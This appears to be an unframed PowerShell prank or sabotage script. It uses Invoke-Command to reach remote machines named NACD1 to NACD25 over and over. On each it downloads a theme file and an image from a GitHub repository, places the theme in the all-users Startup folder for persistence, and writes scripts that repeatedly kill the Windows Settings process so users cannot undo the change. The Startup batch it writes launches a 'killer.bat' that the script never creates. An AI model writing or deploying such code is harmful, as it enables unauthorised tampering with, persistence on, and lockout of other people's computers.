#Will be in C: 


function runOn($tar){

   Invoke-Command -ComputerName $tar -ScriptBlock {



New-Item C:\duck -ItemType Directory

Invoke-WebRequest "https://github.com/Strikinger/FTheme/raw/main/cbtheme.theme" -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cbtheme.theme'

Invoke-WebRequest "https://github.com/Strikinger/FTheme/raw/main/ATCDiscord.png" -OutFile C:\duck\0.jpg

echo 'for ($i = 1; $i -le 10000; $i++) {Stop-Process -Name "systemsettings"}' > 'C:\duck\emansuan.ps1'

echo 'start-job -filepath C:\duck\killer.bat' > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jstotller.bat"




  }
 
 }
 
for ($n0um = 1 ; $n0um -le 2500 ; $n0um++){
for ($num = 1 ; $num -le 25 ; $num++){ 
   Write-Host "NACD$num"
 
   runOn "NACD$num"
 
     
 }
}